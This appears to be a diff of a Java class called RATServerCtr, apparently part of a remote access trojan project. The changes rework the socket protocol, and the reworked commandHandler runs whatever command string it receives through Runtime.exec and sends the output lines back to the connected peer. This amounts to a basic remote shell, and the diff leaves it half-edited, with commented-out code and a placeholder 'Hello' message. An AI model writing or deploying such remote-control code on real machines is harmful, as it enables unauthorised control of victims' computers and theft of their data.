@@ -43,8 +43,10 @@ public class RATServerCtr {
     
     public void sendResult(String res) {
         try {
-            ObjectOutputStream oos = new ObjectOutputStream(list.get(list.size()-1).getOutputStream());
-            oos.writeObject(res);
+//            ObjectOutputStream oos = new ObjectOutputStream(list.get(list.size()-1).getOutputStream());
+            DataOutputStream dout = new DataOutputStream(list.get(list.size()-1).getOutputStream());
+//            oos.writeObject(res);
+            dout.writeUTF(res);
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -64,7 +66,8 @@ public class RATServerCtr {
                     break;
                 default:
                     sendResult("ok");
-                    commandHandler(mode);
+                    commandHandler(mode); //hand and send res
+                    //sendCommandRes();
                     break;
             }
         } catch (Exception e) {
@@ -87,38 +90,58 @@ public class RATServerCtr {
         return input;
     }
     
-    public void CommandRes(String res) throws IOException {
+    public void sendCommandRes() throws IOException {
+        String command = "Hello";
         OutputStream ops = s.getOutputStream();
         DataOutputStream dos = new DataOutputStream(ops);
-        dos.writeUTF(res);
-        System.out.println(res);
+        dos.writeUTF(command);
         dos.flush();
     }
     
-    public void CommandResLenght(int n) throws IOException {
-        String l = Integer.toString(n);
-        OutputStream ops = s.getOutputStream();
-        DataOutputStream dos = new DataOutputStream(ops);
-        dos.writeUTF(l);
-        System.out.println(l);
-        dos.flush();
-    }
+//    public void sendCommandResLenght(int n) throws IOException {
+//        String l = Integer.toString(n);
+//        OutputStream ops = s.getOutputStream();
+//        DataOutputStream dos = new DataOutputStream(ops);
+//        dos.writeUTF(l);
+//        System.out.println(l);
+//        dos.flush();
+//    }
     
     public void commandHandler(String command) throws IOException {
         String c = command;
         try {
-            ArrayList<String> ar = new ArrayList<String>();
-            String line;
+//            //ArrayList<String> ar = new ArrayList<String>();
+//            //String line;
+//            Process proc = Runtime.getRuntime().exec(c);
+//            BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+//            sendCommandRes("hello");
+//            while((line = input.readLine()) != null) {
+//                ar.add(line);   
+//            }
+//            //System.out.println(Arrays.toString(line.split("\s+"))); 
+//            input.close();
+//            sendCommandResLenght(ar.size());
+//            for(int i = 0; i < ar.size(); i++) {
+//                sendCommandRes(ar.get(i));
+//            }
+
+//ArrayList<String> ar = new ArrayList<String>();
+            //String line;
             Process proc = Runtime.getRuntime().exec(c);
             BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+            
+            String line = "";
+            ArrayList<String> lines = new ArrayList<>();
             while((line = input.readLine()) != null) {
-                ar.add(line);   
+                lines.add(line);   
             }
             //System.out.println(Arrays.toString(line.split("\s+"))); 
-            input.close();
-            CommandResLenght(ar.size());
-            for(int i = 0; i < ar.size(); i++) {
-                CommandRes(ar.get(i));
+            DataOutputStream dout = new DataOutputStream(s.getOutputStream());
+            
+            dout.writeInt(lines.size());
+            
+            for (String lineTemp : lines){
+                dout.writeUTF(lineTemp);
             }
         } catch (Exception e) {
             e.printStackTrace();
